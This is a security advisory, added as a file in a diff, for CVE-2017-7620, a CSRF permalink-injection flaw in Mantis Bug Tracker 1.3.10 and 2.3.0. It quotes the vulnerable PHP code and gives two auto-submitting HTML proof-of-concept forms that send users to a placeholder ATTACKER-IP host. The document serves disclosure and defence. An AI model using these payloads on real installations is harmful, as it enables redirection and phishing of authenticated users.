@@ -1,0 +1,109 @@
+[+] Credits: John Page a.k.a hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-CSRF-PERMALINK-INJECTION.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+================
+www.mantisbt.org
+
+
+
+Product:
+=========
+Mantis Bug Tracker
+1.3.10 / v2.3.0
+
+
+MantisBT is a popular free web-based bug tracking system. It is written in PHP works with MySQL, MS SQL, and PostgreSQL databases.
+
+
+
+Vulnerability Type:
+========================
+CSRF Permalink Injection
+
+
+
+CVE Reference:
+==============
+CVE-2017-7620
+
+
+
+Security Issue:
+================
+Remote attackers can inject arbitrary permalinks into the mantisbt Web Interface if an authenticated user visits a malicious webpage.
+
+Vuln code in "string_api.php" PHP file, under mantis/core/ did not account for supplied backslashes.
+Line: 270
+
+# Check for URL's pointing to other domains
+
+if( 0 == $t_type || empty( $t_matches['script'] ) ||
+	
+    3 == $t_type && preg_match( '@(?:[^:]*)?:/*@', $t_url ) > 0 ) {
+
+	
+
+    return ( $p_return_absolute ? $t_path . '/' : '' ) . 'index.php';
+
+}
+
+
+
+# Start extracting regex matches
+
+$t_script = $t_matches['script'];       
+$t_script_path = $t_matches['path'];
+
+
+
+
+Exploit/POC:
+=============
+<form action="http://VICTIM-IP/mantisbt-2.3.0/permalink_page.php?url=\/ATTACKER-IP" method="POST">
+<script>document.forms[0].submit()</script>
+</form>
+
+OR
+
+<form action="http://VICTIM-IP/permalink_page.php?url=\/ATTACKER-IP%2Fmantisbt-2.3.0%2Fsearch.php%3Fproject_id%3D1%26sticky%3Don%26sort%3Dlast_updated%26dir%3DDESC%26hide_status%3D90%26match_type%3D0" method="POST">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: April 9, 2017
+Vendor Release Fix: May 15, 2017
+Vendor Disclosed: May 20, 2017
+May 20, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
